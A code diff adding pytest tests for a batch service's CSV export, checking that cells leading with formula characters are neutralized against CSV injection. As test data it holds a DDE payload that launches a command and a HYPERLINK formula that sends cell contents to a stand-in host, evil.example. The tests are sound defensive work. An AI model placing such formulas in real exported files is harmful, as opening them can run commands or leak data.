@@ -595,3 +595,62 @@ def test_csv_export_carries_the_per_rule_grid_for_a_mixed_batch(
     broken = by_name["broken.png"]
     assert broken["status"] == "error"
     assert [broken[rule_id] for rule_id in rule_ids] == [""] * len(rule_ids)
+
+
+@pytest.mark.parametrize(
+    "raw, expected",
+    [
+        ("=1+1", "'=1+1"),
+        ("+1", "'+1"),
+        ("-1", "'-1"),
+        ("@SUM(A1)", "'@SUM(A1)"),
+        ("\t=1+1", "'\t=1+1"),
+        ("\r=1+1", "'\r=1+1"),
+        ("x.png", "x.png"),  # ordinary name: leading char is safe
+        ("label-2024.png", "label-2024.png"),  # a trigger char in the interior is fine
+        ("brand=value", "brand=value"),
+        ("", ""),  # empty stays empty (no index error)
+    ],
+)
+def test_neutralize_csv_cell_prefixes_only_a_formula_lead(raw: str, expected: str) -> None:
+    # All of = + - @ tab CR are neutralized when they lead a cell; anything else
+    # is returned byte-for-byte, so a legitimate filename is never corrupted.
+    assert batchmod.neutralize_csv_cell(raw) == expected
+
+
+def test_csv_export_neutralizes_a_formula_injection_filename() -> None:
+    # A user names an upload with a DDE payload; opening the exported CSV in a
+    # spreadsheet must not run it. The filename rides create_job -> the export
+    # exactly as the multipart upload set it (CWE-1236, CSV injection).
+    payload = "=cmd|' /C calc'!A1"
+    job = create_job([payload, "safe.png"])
+    for item in job.items:
+        item.status, item.verdict = "done", "pass"
+
+    resp = client.get(f"/batch/{job.id}/export.csv")
+    assert resp.status_code == 200
+    _header, hostile_row, safe_row = list(csv.reader(io.StringIO(resp.text)))
+    # The payload survives as data but is forced to text: the cell now leads with
+    # the apostrophe a spreadsheet consumes, so it is not evaluated on open.
+    assert hostile_row[0] == "'" + payload
+    # A legitimate filename is left unchanged — neutralization must not corrupt it.
+    assert safe_row[0] == "safe.png"
+    # No exported data cell, in any row, begins with a formula lead.
+    for row in (hostile_row, safe_row):
+        for cell in row:
+            assert cell[:1] not in ("=", "+", "-", "@", "\t", "\r")
+
+
+def test_csv_export_neutralizes_a_formula_in_the_detail_cell() -> None:
+    # The filename is not the only user-influenced cell: a finding's detail can
+    # echo filed application text, so the detail column is neutralized too.
+    job = create_job(["safe.png"])
+    job.items[0].status = "done"
+    job.items[0].verdict = "fail"
+    job.items[0].detail = '=HYPERLINK("http://evil.example/?"&A1,"click")'
+
+    resp = client.get(f"/batch/{job.id}/export.csv")
+    header, row = list(csv.reader(io.StringIO(resp.text)))
+    cells = dict(zip(header, row))
+    assert cells["filename"] == "safe.png"  # an ordinary name is still untouched
+    assert cells["detail"].startswith("'=HYPERLINK")
